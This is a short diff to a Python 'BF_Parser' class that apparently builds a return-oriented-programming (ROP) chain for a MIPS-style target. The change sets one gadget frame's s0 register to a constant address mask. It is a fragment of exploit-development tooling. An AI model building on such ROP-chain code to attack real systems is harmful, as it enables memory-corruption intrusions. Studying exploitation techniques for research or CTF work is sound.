@@ -108,7 +108,7 @@ class BF_Parser():
                                                               )
 
                 rop_chain += self.__restore_a3.construct_frame(ra=self.__and_a3_s0.get_vaddr(), \
-                                                               s0=pointer_start, \
+                                                               s0=0x3fffffffff, \
                                                                s2=1 \
                                                                )
                 
